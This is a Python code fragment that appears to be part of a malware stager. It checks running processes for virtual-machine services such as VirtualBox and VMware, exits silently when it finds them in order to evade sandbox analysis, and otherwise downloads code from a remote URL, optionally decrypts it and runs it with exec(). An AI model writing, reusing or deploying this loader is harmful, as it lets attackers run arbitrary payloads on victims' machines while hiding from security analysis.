...
def environment():
    ...
    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmmem']]
    ...
    if url:
        if environment():
            if '--debug' in sys.argv:
                if input("Virtual machine detected. Abort? (y/n): ").startswith('y'):
                    sys.exit(0)
            else:
                sys.exit(0)
        if key:
            exec(decrypt(urllib.request.urlopen(url).read(), base64.b64decode(key)),globals()) 
        else:
            exec(urllib.request.urlopen(url).read(),globals())
